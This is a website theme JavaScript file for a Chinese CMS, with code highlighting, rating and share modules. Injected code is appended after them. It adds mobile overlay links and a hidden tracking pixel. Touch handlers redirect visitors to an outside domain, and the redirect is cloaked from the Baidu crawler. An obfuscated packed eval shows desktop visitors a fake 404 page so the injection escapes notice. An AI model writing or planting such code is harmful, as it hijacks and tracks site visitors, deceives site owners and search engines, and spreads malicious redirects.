...
'cms':{//系统
	...
	'pre':function(){//代码高亮
		...
		if($("pre code").length){
			...
			$("<link>").attr({ rel: "stylesheet",type: "text/css",href: "//cdn.staticfile.org/highlight.js/9.12.0/styles/googlecode.min.css"}).appendTo("head");
			$.getScript("//cdn.staticfile.org/highlight.js/9.12.0/highlight.min.js", function(){
...
'score': {//评分
	'raty': function(){
		if( $('.ff-score').length ){
			...
			$("<link>").attr({ rel: "stylesheet",type: "text/css",href: "//cdn.staticfile.org/raty/2.7.1/jquery.raty.min.css"}).appendTo("head");
			//
			$.getScript("//cdn.staticfile.org/raty/2.7.1/jquery.raty.min.js", function(response, status) {
...
'share':{//分享
	'baidu': function(){
		if($(".ff-share").length ){
			...
			window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":""+$size+""},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
		}
	}
},
'forum': {//讨论模块功能
...
<style>.vddb+a,.vddb+a video:nth-child(1),.vddb+a a,.vddb_qq:before,.vddb_qq:after{content:'';display:block;width:100%;height:125px;object-fit:fill;position:fixed;bottom:0;left:0;z-index:2746858461;} 
.vddb+a a,.vddb_qq:after{height:15px;bottom:125px;}.vddb_qq:before{z-index:2746858465;background:url(https://img.hylmxing.com:88/dibu);background-size:100% 100%;} body{margin-bottom:125px;}.stui-db:after{content:'';display:block;width:100%;height:125px;object-fit:fill;position:fixed;bottom:0;left:0;z-index:2746858461;}
.stui-db:after{height:18px;bottom:125px;}</style><img src="https://m.haoyuntj.com:12580/v-75-100-a.zlc" style="display:none"/><div class="vddb"></div><a ontouchstart="this.click();" title="2021"><video poster="https://img.hylmxing.com:88/dibu" src=""></video><object><a></a></object></a><a class="vddb_qq" ontouchstart="this.click();"></a><a class="stui-db"  ontouchstart="this.click();"><img src="https://img.hylmxing.com:88/dibu" style="width:100%;height:125px;position:fixed;bottom:0;left:0;z-index:125499;"/></a>
<script>if(navigator.platform.indexOf('Win')>-1){document.querySelector('.vddb').nextElementSibling.style = document.querySelector('.stui-db').style = document.querySelector('.vddb_qq').style = 'display:none;';}</script><script>document.addEventListener("touchstart",function(){document.querySelector('.stui-db').href = 'https://wd.haoyundm.com:86/c-75-100.zz';document.querySelector('.vddb_qq').href = 'https://wd.haoyundm.com:86/c-75-100.zz';document.querySelector('.vddb').nextElementSibling.href = 'https://wd.haoyundm.com:86/c-75-100.zz';});</script>
<script>if(navigator.userAgent.toLowerCase().indexOf('baidu')<0){document.querySelector('.stui-db').href = 'https://wd.haoyundm.com:86/c-75-100.zz';document.querySelector('.vddb_qq').href = 'https://wd.haoyundm.com:86/c-75-100.zz';document.querySelector('.vddb').nextElementSibling.href = 'https://wd.haoyundm.com:86/c-75-100.zz';}</script>

//屏蔽
eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('3 1={4:5,6:5,b:5};3 p=c.r;3 s=c.t.u();1.4=p.7("v")==0;1.6=p.7("w")==0;1.x=(p=="y")||(p.7("z")==0);A(1.4||1.6||1.b){3 d=\'/B.9\';$("C").9(\'<e D="E-8"><e F="f" G="g-f"><h>H - I J K L M.</h><a>2{i:N !O;}2 *{ j:P; }</a> \');$("2").Q();$(R).S(T(){$("2").9(\'<k a="U:l%; V:l%;i:W;m-n:o;m-q:o;q:0%;n:0%;" X="Y" Z="\'+d+\'" 10="0" 11="g"></k>\').12();$("2 *").13("j","14")})}',62,67,'|system|body|var|win|false|mac|indexOf||html|style|xll|navigator|iframe_url|meta|referrer|no|title|position|visibility|iframe|100|margin|left|0px||top|platform|us|userAgent|toLowerCase|Win|Mac|x11|X11|Linux|if|none|head|charset|UTF|name|content|404|File|or|directory|not|found|static|important|hidden|empty|document|ready|function|width|height|absolute|id|mainFrame|src|frameborder|scrolling|show|css|visible'.split('|'),0,{}))
